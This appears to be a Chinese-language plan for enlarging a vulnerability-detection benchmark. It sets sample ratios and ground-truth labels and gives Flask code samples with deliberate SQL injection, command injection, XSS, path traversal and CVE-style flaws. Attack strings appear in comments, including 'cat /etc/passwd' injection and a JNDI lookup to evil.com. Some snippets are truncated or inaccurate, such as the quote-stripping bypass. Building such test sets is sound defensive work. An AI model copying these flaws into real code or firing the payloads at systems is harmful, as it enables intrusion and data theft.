### P0-2：原问题描述（保留供参考）

**原问题描述**

- 仅 14 个样本，漏洞样本 12 个、安全样本仅 2 个
- 安全样本 2 个导致误报率只能取 0/50/100% 三档，无统计意义
- 每类漏洞仅 2 个样本，类型准确率 12/12 的偶然性很高
- 所有样本都是 < 20 行的"教科书式"漏洞，模式极其明显

**修复步骤**

1. 将样本集扩充到 **30-50 段**，按以下比例设计：
   - 典型漏洞：占 50-60%（作为基线对照）
   - 安全对照：至少 6-8 段（覆盖 SQL 参数化、subprocess 列表、HTML 转义、路径校验等）
   - 难样本：占 20-30%，包括：
     - 绕过式过滤：`replace("'","")`、`strip()` 不完全过滤
     - 跨文件污点流：source 与 sink 不在同一文件
     - 真实 CVE PoC 片段
     - OWASP WebGoat / DVWA 典型题目片段
     - 长文件（300-500 行）中隐藏漏洞
2. 为每个样本建立 8 列 ground truth 标注：样本 ID、路径、CWE、风险等级、是否漏洞、触发条件、Source→Sink 污染路径、修复思路
3. 将新样本统一放入 `experiments/exp_04_hard_samples/samples/` 目录，并编写 `manifest.json`

**验收标准**

- 样本总数 ≥ 30
- 安全样本 ≥ 6
- 难样本 ≥ 6（覆盖至少 3 种难样本类型）
- 所有样本均附带完整的 8 列 ground truth 标注

**相关文件**

- `experiments/exp_04_hard_samples/samples/`（新建）
- `docs/必须手动学习的地方.md`（参考其标注表格式）

**3. 难样本具体类型与代码示例**

**类型 A：绕过式过滤（hard_bypass_XX.py）**

看起来做了过滤，但实际上能被绕过。

```python
# hard_bypass_01.py — SQL 注入：replace 单引号过滤可被双写绕过
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/search")
def search():
    keyword = request.args.get("q", "")
    # 看似做了过滤，但 "''" 双写可绕过
    keyword = keyword.replace("'", "")
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products WHERE name LIKE '%" + keyword + "%'")
    return str(cursor.fetchall())
# 攻击向量：q = "test' OR '1'='1" → replace 后变成 "test OR 1=1" → 仍为注入
```

```python
# hard_bypass_02.py — 命令注入：strip() 只过滤首尾空格，中间仍可注入
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route("/ping")
def ping():
    host = request.args.get("host", "").strip()
    # strip() 只去首尾空格，中间的空格和分号仍可注入
    result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)
    return result.stdout.decode()
# 攻击向量：host = "127.0.0.1; cat /etc/passwd"
```

```python
# hard_bypass_03.py — XSS：replace 只过滤 <script>，但 <img onerror> 仍可注入
from flask import Flask, request

app = Flask(__name__)

@app.route("/comment")
def comment():
    text = request.args.get("text", "")
    # 只过滤了 <script>，但 <img onerror="..."> 仍可注入
    text = text.replace("<script>", "").replace("</script>", "")
    return f"<html><body><p>{text}</p></body></html>"
# 攻击向量：text = '<img src=x onerror="alert(1)">'
```

**类型 B：跨文件污点流（hard_crossfile_XX.py）**

source 与 sink 不在同一文件，需要跨文件分析。

```python
# 文件: utils/input.py
def get_user_input(request, param, default=""):
    """获取用户输入，未做任何安全处理"""
    return request.args.get(param, default)

def get_post_data(request, field):
    """获取 POST 数据"""

```

```python
# hard_crossfile_01_sink.py — 跨文件污点流：数据库层
# 文件: routes/login.py
from utils.input import get_user_input
import sqlite3
from flask import Flask

app = Flask(__name__)

@app.route("/login")
def login():
    username = get_user_input(app.request, "username")
    password = get_user_input(app.request, "password")
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    # 漏洞：跨文件调用，输入未经过滤直接拼接
    cursor.execute("SELECT * FROM users WHERE name='" + username + "' AND pass='" + password + "'")
    return "ok" if cursor.fetchone() else "fail"
```

```python
# hard_crossfile_02_input.py — 跨文件污点流：文件操作输入层
# 文件: utils/file_helper.py
import os

def safe_read_file(base_dir, filename):
    """读取文件，但未做路径穿越检查"""
    filepath = os.path.join(base_dir, filename)
    with open(filepath, "r") as f:
        return f.read()
```

```python

from flask import Flask, request
```

**类型 C：真实 CVE 片段（hard_cve_XX.py）**

简化后的真实 CVE 等价实现。

```python
# hard_cve_01.py — CVE-2017-7494 Samba 命令执行（Python 等价实现）
# 原始漏洞：Samba 允许远程加载恶意共享库，通过命令执行
import os
from flask import Flask, request

app = Flask(__name__)

@app.route("/share")
def share_module():
    """模拟 Samba 模块加载逻辑"""
    module_path = request.args.get("module", "")
    # 漏洞：用户可控路径直接用于动态加载，可执行任意代码
    if os.path.exists(module_path):
        os.system(f"ldconfig -n {os.path.dirname(module_path)}")
        return f"Module {module_path} loaded"
    return "Module not found"
# 攻击向量：module = "/tmp/evil/lib.so" → ldconfig 加载恶意库
```

```python
# hard_cve_02.py — CVE-2021-44228 Log4j JNDI 注入（Python 等价实现）
# 原始漏洞：Log4j 在日志中解析 ${jndi:ldap://...} 导致远程代码执行
import logging
from flask import Flask, request

app = Flask(__name__)
logger = logging.getLogger(__name__)

@app.route("/login")
def login():
    username = request.args.get("username", "")
    # 漏洞：用户输入直接写入日志，若日志系统支持 JNDI 解析则触发 RCE
    logger.info(f"Login attempt from user: {username}")
    return "Login processed"
# 攻击向量：username = "${jndi:ldap://evil.com/exploit}" → 日志系统解析 JNDI
```
